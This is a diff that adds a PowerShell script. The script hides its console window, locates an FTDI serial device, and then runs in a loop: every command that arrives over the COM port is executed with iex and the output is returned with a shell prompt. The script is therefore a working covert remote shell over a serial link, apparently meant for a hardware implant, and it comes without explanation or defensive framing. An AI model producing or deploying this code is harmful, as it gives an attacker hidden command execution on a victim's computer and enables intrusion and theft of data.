@@ -1,0 +1,39 @@
+# .Net methods for hiding/showing the console in the background
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+function Hide-Console
+{
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+}
+Hide-Console
+$portList = get-pnpdevice -class Ports -ea 0
+if ($portList) {
+     foreach($device in $portList) {
+          if ($device.Present) {
+		if ($device.Manufacturer -eq "FTDI"){
+                  $target = Out-String -InputObject $device.name
+                  $i = $target.LastIndexOf("(")
+                  $j = $target.LastIndexof(")")
+                  $com = $target.SubString($i+1, $j-$i-1)   
+                }          
+          }
+     }
+}
+$port= new-Object System.IO.Ports.SerialPort $com,9600,None,8,one
+$port.Open()
+[byte[]]$bytes = 0..65535|%{0};
+while($port.IsOpen){
+    $data = $port.ReadExisting()
+    if ($data) {
+        $sendback = (iex $data 2>&1 | Out-String )
+        $sendback2  = $sendback + "PS " + (pwd).Path + "> "
+        $port.WriteLine($sendback2)
+    } 
+} 
